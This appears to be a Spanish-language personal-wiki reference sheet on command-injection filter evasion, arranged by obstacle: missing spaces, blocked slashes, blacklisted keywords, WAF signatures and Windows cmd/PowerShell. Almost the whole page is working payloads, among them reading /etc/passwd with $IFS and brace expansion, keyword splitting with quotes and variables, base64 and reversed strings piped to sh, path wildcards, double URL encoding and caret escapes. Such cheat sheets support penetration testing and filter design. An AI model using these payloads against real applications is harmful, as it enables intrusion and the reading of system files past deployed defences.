---
tipo: meta
aliases:
  - Evasión command injection
  - Bypass de filtros de comandos
tags:
  - meta/referencia
  - dominio/web
---

# Command injection evasión - matriz de referencia

> [!info] Referencia pura, no un zettel
> Una sección por obstáculo, en el mismo orden que el árbol de obstáculos de [[MOC - Command injection]]. Las primitivas se combinan entre sí. Equivalente de [[SQLi evasión - matriz de referencia]].

## Sin espacios

El filtro más común, y el que más alternativas tiene.

`cat${IFS}/etc/passwd`
`IFS` es el separador de campos del shell; por defecto vale espacio, tabulador y salto de línea. Es la vía canónica.

`cat$IFS$9/etc/passwd`
`$9` está vacío y sirve de terminador de `$IFS` cuando lo que sigue confundiría al parser. Equivalente a `${IFS}` con menos llaves.

`cat%09/etc/passwd`
Tabulador codificado. Funciona porque el shell lo trata como espacio.

`{cat,/etc/passwd}`
Expansión de llaves de `bash`: se expande a `cat /etc/passwd`. No funciona en `sh` puro.

`cat</etc/passwd`
Redirección de entrada en vez de argumento. Solo sirve para comandos que leen de `stdin`.

`X=$'\x20';cat${X}/etc/passwd`
Construir el espacio en una variable. Verboso, pero pasa filtros que buscan `IFS`.

## Sin barras

Bloquea rutas absolutas.

`${HOME:0:1}etc${HOME:0:1}passwd`
Expansión de subcadena: el primer carácter de `$HOME` es `/`. También sirven `${PWD:0:1}` y `${PATH:0:1}`.

`cd etc; cat passwd`
Evitar el problema en vez de resolverlo. Se navega y se usan rutas relativas.

`echo . | tr '.' '/'`
Construir la barra desde otro carácter.

## Palabra clave bloqueada

Listas negras de `cat`, `whoami`, `nc`, `bash`.

`w'h'oami`
`w"h"oami`
Las comillas vacías desaparecen al parsear. El shell ejecuta `whoami`; el filtro ve otra cosa.

`wh\oami`
La barra invertida delante de un carácter normal se descarta.

`who$@ami`
`who${x}ami`
Variables vacías intercaladas. `$@` sin argumentos no expande a nada.

`a=who;b=ami;$a$b`
Partir el nombre en variables y unirlo al ejecutar. Sobrevive a cualquier filtro de subcadena.

`echo d2hvYW1p | base64 -d | sh`
Codificar el comando entero. El filtro no ve ninguna palabra clave porque no hay ninguna en texto claro.

`/???/c?t /???/p?????`
Comodines de ruta: `/bin/cat /etc/passwd` sin escribir ninguno de los dos nombres. Frágil —puede coincidir con otro binario— pero pasa filtros muy estrictos.

`rev <<< 'imaohw' | sh`
Invertir la cadena. Variante barata cuando `base64` no está.

## Listas blancas de comandos

La app solo permite un comando de una lista corta y valida el resto del argumento.

Acá las evasiones de arriba no sirven: el nombre del comando está fijo. La salida es [[Argument injection - abuso de flags]] — abusar de las flags del comando **permitido** en vez de invocar otro. Ver [[Argument injection - matriz de referencia]].

## WAF con firma

`;$(echo${IFS}aWQ=|base64${IFS}-d)`
Combinar codificación con evasión de espacios: la firma que busca el WAF no aparece en ningún lado.

`;i\d`
Escapes gratuitos rompen la coincidencia literal sin cambiar la semántica.

`%252e%252e`
Doble codificación, cuando el WAF decodifica una vez y la app decodifica otra.

`;id;#`
Comentario final para descartar lo que el WAF pudiera anexar.

Mover el payload de `GET` a `POST`, o a una cabecera que la app procese, esquiva reglas que solo inspeccionan el query string.

## Windows

`who^ami`
`^` es el escape de `cmd`: se descarta al parsear. Equivalente al `\` de Unix.

`who"ami`
Comilla suelta. `cmd` la elimina en contextos donde no abre una cadena.

`w^h^o^a^m^i`
Un escape entre cada carácter. Destroza cualquier firma literal.

`powershell -enc <base64-utf16le>`
Comando codificado. **Ojo**: `-enc` espera UTF-16LE, no UTF-8 — es el error más común al construirlo.

`set a=who&& set b=ami&& call %a%%b%`
Concatenación por variables de entorno, equivalente al truco de `sh`. `call` fuerza la segunda expansión.

## Cuando nada de esto entra

Si el filtro impide toda ruptura del contexto, el problema deja de ser de evasión: no hay shell, o el escapado es correcto. Volver al nodo raíz de [[MOC - Command injection]] y evaluar [[Argument injection - abuso de flags]].
